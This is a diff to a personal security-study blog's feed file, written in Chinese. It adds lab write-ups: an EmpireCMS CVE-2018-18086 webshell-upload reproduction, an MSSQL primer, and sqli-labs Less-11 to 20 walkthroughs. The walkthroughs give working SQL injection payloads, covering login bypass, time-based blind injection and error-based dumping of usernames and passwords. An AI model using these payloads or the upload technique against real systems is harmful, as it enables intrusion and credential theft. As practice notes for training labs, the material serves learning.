@@ -4,6 +4,63 @@
   
   
   <entry>
+    <title>帝国漏洞复现（CVE-2018-18086）</title>
+    <link href="/2022/04/13/%E5%B8%9D%E5%9B%BD%E5%A4%8D%E7%8E%B0/"/>
+    <url>/2022/04/13/%E5%B8%9D%E5%9B%BD%E5%A4%8D%E7%8E%B0/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>EmpireCMS（帝国网站管理系统）是一套内容管理系统（CMS）。 EmpireCMS 7.5版本中的e&#x2F;class&#x2F;moddofun.php文件的‘LoadInMod’函数存在安全漏洞。攻击者可利用该漏洞上传任意文件。 用户名密码：admin&#x2F;123456 后台路径：&#x2F;empirecms&#x2F;e&#x2F;admin</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><ul><li>后台访问</li><li>输入用户名密码，登陆</li><li>进入后，点击系统-管理数据库-导入系统模型</li><li>填任意表名，导入.php.mod文件（此处不写内容了，笔记穿不上去）</li><li>确保上传成功</li><li>蚁剑链接（添加数据，输入后台网址，密码cmd，打开后，注意flag在根目录temp下）</li></ul>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>文件上传靶场练习</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>MMSql简介</title>
+    <link href="/2022/04/13/MSSql/"/>
+    <url>/2022/04/13/MSSql/</url>
+    
+    <content type="html"><![CDATA[<h1 id="MSSql简介"><a href="#MSSql简介" class="headerlink" title="MSSql简介"></a>MSSql简介</h1><div class="code-wrapper"><pre><code class="hljs">MSSql是微软的SQLServer数据库服务器，是一个数据平台，提供数据库从服务器到终端的完整解决方案，其中数据库服务器部分，是一个数据管理系统，用于建立、使用和维护数据。</code></pre></div><p>   <strong>渗透角度介绍</strong>：随着更新，它的安全性越来越高，渗透最舒服的版本是2008年之前的，08和以后的版本数据库权限不再是system，相当于MySQL的mssql重了很多。所以一般数据库mssql支持多语句我们就可以看是不是应该直接拿下webshell</p><h1 id="MSSql基本使用"><a href="#MSSql基本使用" class="headerlink" title="MSSql基本使用"></a>MSSql基本使用</h1><ul><li>创建数据库：CREATE DATABASE[dbname]</li><li>删除数据库：drop daabase[dbname]</li><li>创建新表：create table [tablename](name char(10),age tinyint,sex int)</li><li>删除新表：drop table[tablename]</li><li>向表中插入内容：insert into <a href="field2">tabkename</a> values(value1,value2)</li><li>更新内容：update [tablename] set field1&#x3D;value1 where 范围</li><li>查找：select * from [tablename] where field1&#x3D;”ichunqiu”</li></ul><h1 id="MSSql权限控制"><a href="#MSSql权限控制" class="headerlink" title="MSSql权限控制"></a>MSSql权限控制</h1><p><strong>什么是固定服务器角色？</strong></p><p>由于服务器是在服务层次定义的，因此它从属于服务器的数据库外面。有以下7种</p><ul><li>sysadmin  执行SQL Server中的任何动作</li><li>serveradmin 配置服务器设置</li><li>setupadmin  安装复制和管理拓展过程</li><li>securityadmin 管理登陆和CREAT DATABASE的权限以及阅读审计</li><li>processadin 管理SQL Server进程</li><li>dbcreator 创建和修改数据库</li><li>diskadmin 管理磁盘文件</li></ul><h1 id="MSSql注入"><a href="#MSSql注入" class="headerlink" title="MSSql注入"></a>MSSql注入</h1><p><strong>MSSql和SQL注入的区别</strong></p><ol><li>对象不同：</li></ol><ul><li>MSSql：Microsoft SQL SERVER数据库</li><li>SQL：MySQL数据库</li></ul><ol start="2"><li>语句不同：数据库不同，语法自然有差异</li></ol><p><strong>在注入过程中常用MSSql结构——information_shema结构</strong><br>nformation_shema结构包含数据库关键信息</p><ul><li>“SCHEMATA”表，存储数据库名，关键字段为SCHEMA_NAME表示数据库名称</li><li>“TABLES”表，存储表名，关键字段TABLE_NAME表示表的名称</li><li>“COLUMNS”表，存储字段名，关键字段COLUMN_NAME表示字段名</li></ul><p><strong>简单介绍到这，欢迎补充</strong></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>MSSql</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>sqli-labs漏洞平台靶场练习（11-20）</title>
+    <link href="/2022/04/13/Sqil-labs%EF%BC%8811-20%EF%BC%89/"/>
+    <url>/2022/04/13/Sqil-labs%EF%BC%8811-20%EF%BC%89/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Less-11-基于错误的POST型单引号字符型注入"><a href="#Less-11-基于错误的POST型单引号字符型注入" class="headerlink" title="Less-11 基于错误的POST型单引号字符型注入"></a>Less-11 基于错误的POST型单引号字符型注入</h1><div class="code-wrapper"><pre><code class="hljs">    查看源代码后，看一下提交类型、字段、网络查看器。发现方法是POST，表单是username和password。我们加一个单引号让它报错。    然后被单引号引着的复制下来，把左端和右端的单引号去掉：test&#39; LIMIT 0,1    判断为单引号注入类型，接下来构建POST提交    uname=user&#39; or 1=1 #&amp;passwd=user&#39;    页面返回用户名和密码。输入即可成功登陆。</code></pre></div><h1 id="Less-12-基于错误的双引号POST型字符型变形的注入"><a href="#Less-12-基于错误的双引号POST型字符型变形的注入" class="headerlink" title="Less-12 基于错误的双引号POST型字符型变形的注入"></a>Less-12 基于错误的双引号POST型字符型变形的注入</h1><div class="code-wrapper"><pre><code class="hljs">    用单引号试试，POST：uname=abc&amp;passwd=abc&#39;    在页面回显这里明显看出用)将变量括着，那么直接绕过，构建 POST 字段：uname=abc&amp;passwd=abc&quot;) or 1=1#</code></pre></div><h1 id="Less-13-POST单引号变形双注入"><a href="#Less-13-POST单引号变形双注入" class="headerlink" title="Less-13 POST单引号变形双注入"></a>Less-13 POST单引号变形双注入</h1><div class="code-wrapper"><pre><code class="hljs">    查看源代码，同12差不多，判断为(&#39;$id&#39;)    构建POST:uname=abc&amp;passwd=abc&#39;) or 1=1#</code></pre></div><h1 id="Less-14-POST单引号变形双注入"><a href="#Less-14-POST单引号变形双注入" class="headerlink" title="Less-14 POST单引号变形双注入"></a>Less-14 POST单引号变形双注入</h1><div class="code-wrapper"><pre><code class="hljs">    单引号没报错，双引号就报错了    构建POST：uname=abc&amp;passwd=abc&quot;</code></pre></div><h1 id="Less-15-基于bool型-x2F-时间延迟单引号POST型盲注"><a href="#Less-15-基于bool型-x2F-时间延迟单引号POST型盲注" class="headerlink" title="Less-15 基于bool型&#x2F;时间延迟单引号POST型盲注"></a>Less-15 基于bool型&#x2F;时间延迟单引号POST型盲注</h1><div class="code-wrapper"><pre><code class="hljs">    输入单引号，双引号就不会报错了，用时间延迟函数了，先确定是单引号盲注：uname=abc&amp;passwd=abc&#39;or legth(database())=8#</code></pre></div><h1 id="Less-16-基于bool型-x2F-时间延迟的双引号POST型盲注"><a href="#Less-16-基于bool型-x2F-时间延迟的双引号POST型盲注" class="headerlink" title="Less-16 基于bool型&#x2F;时间延迟的双引号POST型盲注"></a>Less-16 基于bool型&#x2F;时间延迟的双引号POST型盲注</h1><div class="code-wrapper"><pre><code class="hljs">     uname=a&amp;passwd=a&quot;) or 1=1# ，判断为双引号变形，测试：     uname=a&amp;passwd=a&quot;)  or if(length(database())=7,1,sleep(5)) #     uname=a&amp;passwd=a&quot;)  or if(length(database())=8,1,sleep(5)) #</code></pre></div><h1 id="Less-17-基于错误的更新查询POST注入"><a href="#Less-17-基于错误的更新查询POST注入" class="headerlink" title="Less-17 基于错误的更新查询POST注入"></a>Less-17 基于错误的更新查询POST注入</h1><div class="code-wrapper"><pre><code class="hljs">     子查询注入原理即双注入，对于dateup、delete和insert通常都是结合or的逻辑判断，本题我们对update可以构造如下语句:     获取数据库名：     uname=admin&amp;passwd=&#39; or (select 1 from(select count(*),concat((select concat(0x7e,0x27,database(),0x27,0x7e)),floor(rand()*2))x from information_schema.tables group by x)a) where username=&#39;admin&#39;%23     获取表名：     uname=admin&amp;passwd=&#39; or (select 1 from(select count(*),concat((select group_concat(0x7e,0x27,table name,0x27,0x7e)),from information schema.tables where table_schema=&#39;security&#39;),floor(rand()*2)x from information_schema.tables group by x)a) where username=&#39;admin&#39;%23</code></pre></div><h1 id="Less-18-基于错误的用户代理，头部POST注入"><a href="#Less-18-基于错误的用户代理，头部POST注入" class="headerlink" title="Less-18 基于错误的用户代理，头部POST注入"></a>Less-18 基于错误的用户代理，头部POST注入</h1><div class="code-wrapper"><pre><code class="hljs">    输入POST:uname=admin&amp;passwd=1&amp;submit=Submit        用burp抓包改包，获取数据库名称    将Firefox后面改成：&#39;or updatexml(1,concat(0x2b5e,database()),0) or &#39; ‘and exteactvalue(1,concat(0x7e,(database())) and ‘1‘1‘=‘1      获取用户名、密码：&#39;or updatexml(1,concat(0x2b5e,(select concat_ws(0x2b5e,id,usernaem,password) from users limit 0,1)),0) or &#39;</code></pre></div><h1 id="Less-19-基于头部的Referer-POST报错"><a href="#Less-19-基于头部的Referer-POST报错" class="headerlink" title="Less-19 基于头部的Referer POST报错"></a>Less-19 基于头部的Referer POST报错</h1><div class="code-wrapper"><pre><code class="hljs">    跟18差不多，在burp修改referer    获取用户名和密码：or extractvalue(1,concat(0x2b5e,(select concat_ws(0x2b5e,id,usernaem,password) from users limit 0,1)),0) or &#39;</code></pre></div><h1 id="Less-20-基于错误的cookie头部POST注入"><a href="#Less-20-基于错误的cookie头部POST注入" class="headerlink" title="Less-20 基于错误的cookie头部POST注入"></a>Less-20 基于错误的cookie头部POST注入</h1><div class="code-wrapper"><pre><code class="hljs">     看有无cookie，如果删除了cookie的按钮，后台会把它的时间设置为过期的时间    构建语句：     admin&#39; union select 1,group_concat(char(32),username,char(32)),group_concat(char(32),password,char(32)) from users--+</code></pre></div>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>sqli-labs靶场练习</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>sqlmap</title>
     <link href="/2022/04/04/sqlmap%E5%AE%89%E8%A3%85+%E5%BA%94%E7%94%A8/"/>
     <url>/2022/04/04/sqlmap%E5%AE%89%E8%A3%85+%E5%BA%94%E7%94%A8/</url>
